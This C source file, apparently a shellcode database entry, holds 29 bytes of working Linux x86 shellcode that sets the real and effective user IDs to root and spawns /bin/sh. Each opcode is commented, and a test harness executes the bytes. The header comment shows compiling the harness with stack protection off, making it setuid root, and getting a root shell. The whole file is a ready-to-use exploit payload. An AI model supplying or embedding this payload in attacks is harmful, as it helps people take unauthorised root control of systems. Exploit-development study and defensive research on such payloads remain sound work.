/*
	Author: 	Artur [ajes] Szymczak (2021)
	Function:	Linux x86 shellcode, setreuid to 0 and then execute /bin/sh
	Size:		29 bytes

	Testing:

$ gcc -fno-stack-protector -z execstack shellcode_tester.c -o shellcode
shellcode_tester.c: In function ‘main’:
shellcode_tester.c:25:2: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
shellcode_tester.c:25:24: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
$ sudo chown root:root ./shellcode
$ sudo chmod u+s ./shellcode
$ ./shellcode
Length: 29
# id
uid=0(root) gid=1000(artur) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(artur)

*/

char shellcode[] = ""
	"\x31\xc0"		// clear eax, as we don't know its state
	"\xb0\x46"		// syscall setreuid
	"\x31\xdb"		// real user ID = 0
	"\x31\xc9"		// effective user ID = 0
	"\x99"			// saved set-user-ID = 0 (using EDX)
	"\xcd\x80"		// call it

	"\x96"			// clear eax, as we don't know its state after former syscall
	"\xb0\x0b"		// syscall execve
	"\x53"			// NULL string terminator
	"\x68\x2f\x2f\x73\x68"	// //sh
	"\x68\x2f\x62\x69\x6e"	// /bin
	"\x89\xe3"		// pointer to above string - path to the program to execve
	"\xcd\x80";		// call it

void main(void)
{
	printf("Length: %d\n",strlen(shellcode));
	((void(*)(void))shellcode)();
}